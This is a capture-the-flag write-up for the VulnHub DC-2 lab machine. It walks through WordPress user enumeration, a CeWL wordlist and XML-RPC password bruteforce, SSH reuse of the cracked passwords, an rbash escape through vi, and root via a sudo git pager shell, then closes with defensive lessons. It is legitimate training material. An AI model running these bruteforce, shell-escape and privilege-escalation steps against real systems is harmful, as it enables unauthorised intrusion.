# DC-2

**Platform:** VulnHub | **Difficulty:** Beginner | **Date:** Feb. 2026

> Author: DCAU — [VulnHub page](https://www.vulnhub.com/entry/dc-2,311/)

## 1. Reconnaissance

Identify the target on the local network, then enumerate open ports and services.

```bash
nmap -sn 10.0.2.0/24
nmap -sC -sV -p- 10.0.2.19
```

**Observed:**

```
Nmap scan report for dc-2 (10.0.2.19)
Host is up (0.00033s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: DC-2 &#8211; Just another WordPress site
|_http-generator: WordPress 4.7.10
|_http-server-header: Apache/2.4.10 (Debian)
7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two ports open: **80** (HTTP, WordPress) and an SSH service running on a **non-standard port, 7744** instead of the usual 22.

Nmap resolves the host as `dc-2`, which WordPress actually needs: its homepage redirects based on the configured site URL, so the target must be mapped in `/etc/hosts` (`10.0.2.19 dc-2`) to browse and log in correctly.

## 2. Enumeration

The site is a **WordPress 4.7.10** install (outdated, released 2018), using the default "Twenty Seventeen" theme. `wpscan` is used to enumerate installed users, since WordPress usernames are often different from the display names shown on posts:

```bash
wpscan -e u --url http://dc-2
```

```
[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).
[+] Enumerating Users (via Passive and Aggressive Methods)
[+] admin
[+] jerry
[+] tom
[i] 3 user(s) Identified.
```

Three valid usernames are confirmed: `admin`, `jerry`, `tom`.

### Flag 1

Browsing the site reveals the first flag directly in its content, hinting at the next step:

```
Your usual wordlists probably won't work, so instead, maybe you just need to be cewl.

More passwords is always better, but sometimes you just can't win them all.

Log in as one to see the next flag.

If you can't find it, log in as another.
```

The hint points to **CeWL** (Custom Word List generator), a tool that builds a wordlist by scraping words directly from a target website — useful here since the WordPress content itself likely contains the passwords used on the box:

```bash
cewl -w custom_wordlist.txt http://dc-2
```

A list of the three usernames found above is also prepared (`users.txt`) to pair with the generated wordlist.

## 3. Exploitation

### Credential bruteforce via XML-RPC

WordPress's XML-RPC endpoint (`xmlrpc.php`) accepts authentication requests and, unlike the standard login form, allows many credential attempts to be bundled into very few HTTP requests — making it a much faster bruteforce vector than `wp-login.php`:

```bash
wpscan -U users.txt -P custom_wordlist.txt --url http://dc-2
```

```
[+] Performing password attack on Xmlrpc against 3 user/s
[SUCCESS] - jerry / adipiscing
[SUCCESS] - tom / parturient

[!] Valid Combinations Found:
 | Username: jerry, Password: adipiscing
 | Username: tom, Password: parturient
```

Two valid credential pairs are recovered: `jerry:adipiscing` and `tom:parturient`.

### Flag 2

Logging into the WordPress dashboard with either account only gives low-privilege access (no plugin editor, no theme editor, no further RCE path from within WordPress) and reveals the second flag:

```
If you can't exploit WordPress and take a shortcut, there is another way.

Hope you found another entry point.
```

This points to the other open port: SSH on **7744**. WordPress users often reuse their password elsewhere, so the recovered credentials are tried there instead:

```bash
ssh tom@dc-2 -p 7744
```

This logs in successfully with `tom:parturient`.

### Breaking out of a restricted shell

```bash
tom@DC-2:~$ ls
flag3.txt  usr
tom@DC-2:~$ cat flag3.txt
-rbash: cat: command not found
tom@DC-2:~$ ls usr/bin
less  ls  scp  vi
```

The `-rbash` prompt and the near-empty `usr/bin` folder reveal that `tom` is locked into a **restricted shell** (`rbash`), which only allows a short whitelist of commands (`less`, `ls`, `scp`, `vi`) and blocks `cd`, absolute paths, and PATH changes.

`vi` is a well-known restricted-shell escape: once inside the editor, its built-in `:shell` command spawns a full, unrestricted shell:

```
:set shell=/bin/bash
:shell
```

This drops into a normal bash shell, still as `tom` but no longer sandboxed by `rbash`.

### Flag 3

```bash
tom@DC-2:~$ cat flag3.txt
bash: cat: command not found
tom@DC-2:~$ echo $PATH
/home/tom/usr/bin
tom@DC-2:~$ PATH=/usr/bin:/usr/sbin:/bin:/sbin
tom@DC-2:~$ cat flag3.txt
Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
```

The shell inherited from `vi` still has the restricted `PATH` (`/home/tom/usr/bin`) baked in, so standard binaries like `cat` aren't found until `PATH` is reset to the normal system directories. The flag itself hints at switching user to `jerry` — whose password (`adipiscing`) was already recovered during the WPScan bruteforce:

```bash
tom@DC-2:~$ su jerry
Password:
```

### Flag 4

```bash
jerry@DC-2:~$ cat flag4.txt
Good to see that you've made it this far - but you're not home yet.

You still need to get the final flag (the only flag that really counts!!!).

No hints here - you're on your own now.  :-)

Go on - git outta here!!!!
```

The phrasing ("git outta here") is a direct hint toward the privilege escalation vector.

## 4. Privilege Escalation

```bash
jerry@DC-2:~$ sudo -l
Matching Defaults entries for jerry on DC-2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jerry may run the following commands on DC-2:
    (root) NOPASSWD: /usr/bin/git
```

`jerry` can run `git` as root without a password. According to [GTFOBins](https://gtfobins.github.io/gtfobins/git/), `git` can be abused for privilege escalation because some of its subcommands (like `help` or `log`) open their output through a **pager** (`less` by default), and `less` allows spawning a shell with `!<command>` — which, since `git` itself was launched via `sudo`, inherits root privileges:

```bash
jerry@DC-2:~$ sudo git -p help config
```

Once inside the pager:

```
!/bin/bash
```

```bash
root@DC-2:/home/jerry# whoami
root
```

### Final flag

```bash
root@DC-2:~# cat final-flag.txt
 __    __     _ _       _                    _
/ / /\ \ \___| | |   __| | ___  _ __   ___  / \
\ \/  \/ / _ \ | |  / _` |/ _ \| '_ \ / _ \/  /
 \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/
  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/

Congratulatons!!!

A special thanks to all those who sent me tweets
and provided me with feedback - it's all greatly
appreciated.

If you enjoyed this CTF, send me a tweet via @DCAU7.
```

## 5. Lessons Learned

- Running WordPress content itself through a wordlist generator (CeWL) is a reminder that any text published on a site (posts, comments, bios) can become an attacker's dictionary — especially when admins reuse site-related words as passwords.
- XML-RPC is a much more efficient bruteforce vector than the login form, since multiple credential checks can be batched into a single request; it should be disabled if not actively used (e.g. for the WordPress mobile app or Jetpack).
- Restricted shells (`rbash`) are not a substitute for proper privilege separation — any whitelisted binary with built-in shell escape capabilities (`vi`, `less`, `more`, `man`, ...) defeats them entirely.
- Password reuse between a web application and system accounts (SSH, `su`) turns a single leaked credential into a full foothold.
- `sudo` rules should never grant broad access to multi-purpose binaries like `git`, `find`, `vim`, or `less` — even "just one command" can hide a shell escape. Always check [GTFOBins](https://gtfobins.github.io/) before writing a `sudoers` rule.
- **Fix:** update WordPress core and disable XML-RPC if unused, remove the restricted-shell whitelist entries that allow shell escapes (or use a properly jailed environment instead of `rbash`), enforce unique passwords per service, and scope `sudo` rules to specific subcommands/arguments rather than whole binaries.
